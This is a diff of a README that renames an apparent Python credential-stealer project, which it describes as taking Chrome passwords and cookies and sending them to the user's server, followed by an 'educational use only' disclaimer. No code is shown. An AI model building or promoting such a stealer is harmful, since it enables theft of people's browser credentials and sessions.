@@ -1,5 +1,5 @@
-# RedLine-Stealer
-python RedLine Stealer get the chrome pwd and cookie then send them to your server
+# PY-Stealer
+python  Stealer get the chrome pwd and cookie then send them to your server
 
 # LEGAL NOTICE
 THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY! IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT. BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
